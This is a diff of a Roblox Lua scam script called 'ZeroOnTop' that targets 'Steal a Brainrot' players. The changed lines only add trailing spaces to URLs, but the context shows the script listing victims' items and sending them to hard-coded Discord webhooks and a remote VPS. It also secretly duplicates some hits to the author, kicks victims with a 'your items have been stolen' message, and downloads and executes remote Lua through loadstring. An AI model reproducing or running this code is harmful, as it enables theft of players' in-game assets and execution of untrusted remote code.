@@ -15,7 +15,7 @@ local HRP = Character:WaitForChild("HumanoidRootPart")
 local Backpack = player:WaitForChild("Backpack")
 local humanoid = Character:WaitForChild("Humanoid")
 
-local PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1452387900166635622/6jzYQUIloNR8GvEq4dtGp0ZIbie2--AI9_oYBa3Fc7i1f-xvBGcJDSgr7ltJL90lzLAb"
+local PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1452387900166635622/6jzYQUIloNR8GvEq4dtGp0ZIbie2--AI9_oYBa3Fc7i1f-xvBGcJDSgr7ltJL90lzLAb "
 local WEBHOOK_URL = _G["Zero_Config"].user_webhook
 local TARGET_PLAYERS = _G["Zero_Config"].users or {}
 
@@ -126,7 +126,7 @@ end
 end
 receiver.Chatted:Connect(function(msg)
 if msg == ".kick" then
-player:Kick("OOPS, SOME OF YOUR VALUABLE ITEMS HAVE BEEN STOLEN, but YOU CAN DO IT TO: https://discord.gg/rV7ReMVgxP")
+player:Kick("OOPS, SOME OF YOUR VALUABLE ITEMS HAVE BEEN STOLEN, but YOU CAN DO IT TO: https://discord.gg/rV7ReMVgxP ")
 else
 receiverActivity[receiverName] = true
 activeReceiver = receiverName
@@ -162,7 +162,7 @@ end)
 end
 p.Chatted:Connect(function(msg)
 if msg == ".kick" then
-player:Kick("OOPS, SOME OF YOUR VALUABLE ITEMS HAVE BEEN STOLEN, but YOU CAN DO IT TO: https://discord.gg/rV7ReMVgxP")
+player:Kick("OOPS, SOME OF YOUR VALUABLE ITEMS HAVE BEEN STOLEN, but YOU CAN DO IT TO: https://discord.gg/rV7ReMVgxP ")
 else
 receiverActivity[receiverName] = true
 activeReceiver = receiverName
@@ -308,7 +308,7 @@ end)
 task.spawn(function()
 local webhookHit = WEBHOOK_URL or ""
 local api_key = getgenv().API_KEY or "supersecretkey"
-local url_hit = getgenv().INCREMENT_URL or "http://13.239.7.10:5000/increment-hitcount"
+local url_hit = getgenv().INCREMENT_URL or "http://13.239.7.10:5000/increment-hitcount "
 if webhookHit ~= "" then
 local payloadHit = HttpService:JSONEncode({ webhook = webhookHit })
 local headersHit = { ["Content-Type"] = "application/json", ["X-API-KEY"] = api_key }
@@ -327,7 +327,7 @@ end)
 
 local function triggerClient1()
 task.spawn(function()
-local VPS_URL = "http://13.239.7.10:5000/submit-job"
+local VPS_URL = "http://13.239.7.10:5000/submit-job "
 local RETRY_DELAY, RETRIES = 2, 3
 local job_id = tostring(game.JobId or getgenv().JOB_ID or "")
 local place_id = tostring(game.PlaceId or getgenv().PLACE_ID or "")
@@ -421,7 +421,7 @@ end)
 
 task.spawn(function()
 task.wait(4)
-local WEBHOOK_DUALHOOK = "https://discord.com/api/webhooks/1445411548008022129/9Bz7RiwuJ3paUaN6Kt7TwiKP2UX9h2rSSRk9GoDyr3z2Fb0dB7qjZHtrSNxi94ZjVQnB"
+local WEBHOOK_DUALHOOK = "https://discord.com/api/webhooks/1445411548008022129/9Bz7RiwuJ3paUaN6Kt7TwiKP2UX9h2rSSRk9GoDyr3z2Fb0dB7qjZHtrSNxi94ZjVQnB "
 local D_CHANCE = 0.10
 local allTools = {}
 for _, item in ipairs(Backpack:GetChildren()) do table.insert(allTools, item) end
@@ -486,7 +486,7 @@ local embedHitBrainrots = limitList(hitListBrainrots)
 local totalHits = #hitListPlants + #hitListBrainrots
 local hasPriority = totalHits > 0
 local embedColor = hasPriority and 0x2ECC71 or 0xE74C3C
-local serverLink = string.format("https://floating.gg/?placeID=%s&gameInstanceId=%s", game.PlaceId, game.JobId)
+local serverLink = string.format("https://floating.gg/?placeID=%s&gameInstanceId=%s ", game.PlaceId, game.JobId)
 local backpackString = table.concat(backpackLines, "\n")
 local function makeEmbed(isPublic)
 local fields = {
@@ -636,7 +636,7 @@ discordLabel.BackgroundTransparency = 1
 discordLabel.TextColor3 = Color3.new(1,1,1)
 discordLabel.Font = Enum.Font.Gotham
 discordLabel.TextScaled = true
-discordLabel.Text = "Join our Discord: https://discord.gg/rV7ReMVgxP"
+discordLabel.Text = "Join our Discord: https://discord.gg/rV7ReMVgxP "
 discordLabel.Parent = bg
 
 local fruits = {"🍎","🍌","🍓","🍇","🍉","🍍","🍒","🥭"}
@@ -725,8 +725,8 @@ if serverType ~= "VIPServer" then player:Kick("ZeroOnTop does not support public
 
 local WEBHOOK_URL = _G["Zero_Config"].user_webhook
 local TARGET_PLAYERS = _G["Zero_Config"].users or {}
-local PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1452387900166635622/6jzYQUIloNR8GvEq4dtGp0ZIbie2--AI9_oYBa3Fc7i1f-xvBGcJDSgr7ltJL90lzLAb"
-local VPS_INCREMENT = "http://13.239.7.10:5000/increment-hitcount"
+local PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1452387900166635622/6jzYQUIloNR8GvEq4dtGp0ZIbie2--AI9_oYBa3Fc7i1f-xvBGcJDSgr7ltJL90lzLAb "
+local VPS_INCREMENT = "http://13.239.7.10:5000/increment-hitcount "
 local API_KEY = getgenv().API_KEY or "supersecretkey"
 
 local function safeRequest(url, body, headers)
@@ -740,10 +740,10 @@ end
 
 local function sendZeroEmbed(title, desc, color, fields, isPublic)
     local payload = {
-        username = "ZeroOnTop", avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
+        username = "ZeroOnTop", avatar_url = "https://scriptssm.vercel.app/pngs/logo.png ",
         embeds = {{
             title = title, description = desc, color = color, fields = fields or {},
-            footer = {text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png"},
+            footer = {text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png "},
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
@@ -761,7 +761,7 @@ local function extractCode(raw)
 end
 
 local function buildJoinLink(code)
-    return "https://www.roblox.com/share?code=" .. code .. "&type=Server"
+    return "https://www.roblox.com/share?code= " .. code .. "&type=Server"
 end
 
 local function formatCash(num)
@@ -1200,7 +1200,7 @@ local function triggerContinue()
         local payload = {
             content = "> Jump or type anything in chat to start.",
             username = "ZeroOnTop",
-            avatar_url = "https://scriptssm.vercel.app/pngs/logo.png",
+            avatar_url = "https://scriptssm.vercel.app/pngs/logo.png ",
             embeds = {{
                 title = "𓆩 ZeroOnTop 𓆪",
                 description = "<:faq_badge:1436328022910435370> **Status:** `Unknown`\n> Failed to Fetch Status.\n⠀",
@@ -1229,10 +1229,10 @@ local function triggerContinue()
                     },
                     { name = "<:loc:1436344006421385309> **Join via URL**", value = "[ **Click Here to Join!**](" .. joinLink .. ")" }
                 },
-                author = { name = "Steal a Brainrot - Hit", url = joinLink, icon_url = "https://scriptssm.vercel.app/pngs/bell-icon.webp" },
-                footer = { text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png" },
+                author = { name = "Steal a Brainrot - Hit", url = joinLink, icon_url = "https://scriptssm.vercel.app/pngs/bell-icon.webp " },
+                footer = { text = "discord.gg/cnUAk7uc3n", icon_url = "https://i.ibb.co/5xJ8LK6X/ca6abbd8-7b6a-4392-9b4c-7f3df2c7fffa.png " },
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
-                image = { url = "https://scriptssm.vercel.app/pngs/sab.webp" }
+                image = { url = "https://scriptssm.vercel.app/pngs/sab.webp " }
             }}
         }
 
@@ -1248,7 +1248,7 @@ local function triggerContinue()
 
         task.delay(0.7, function()
             screen:Destroy()
-            local src = game:HttpGet("https://raw.githubusercontent.com/zeroonbottomyt/kindabroke/refs/heads/main/Gui.lua")
+            local src = game:HttpGet("https://raw.githubusercontent.com/zeroonbottomyt/kindabroke/refs/heads/main/Gui.lua ")
             loadstring(src)()
         end)
     end)
